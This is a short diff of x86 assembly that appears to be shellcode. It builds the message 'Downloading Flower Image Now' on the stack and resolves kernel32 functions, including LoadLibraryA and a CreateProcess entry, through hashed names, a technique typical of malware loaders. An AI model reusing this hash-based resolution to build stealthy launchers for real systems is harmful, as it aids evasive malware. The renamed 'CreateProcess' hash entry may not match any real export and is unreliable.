@@ -73,7 +73,7 @@ push 0x776f4e20 ; pushing above sentence backwords
 push 0x6567616d
 push 0x49207265
 push 0x776f6c46
-push 0x20676369
+push 0x20676e69
 push 0x64616f6c
 push 0x6e776f44
 mov eax, esp ; mov pointer to eax
@@ -220,7 +220,7 @@ ret
 KERNEL32HASHTABLE:
 	dd 0x95902b19 ; ExitProcess
 	dd 0xc8ac8026 ; LoadLibraryA
-	dd 0x46318ac7 ; CreateProcessA
+	dd 0x0c8c6315 ; CreateProcess
 	dd 0xFFFF ; make sure to end with this token
 
 KERNEL32FUNCTIONSTABLE:
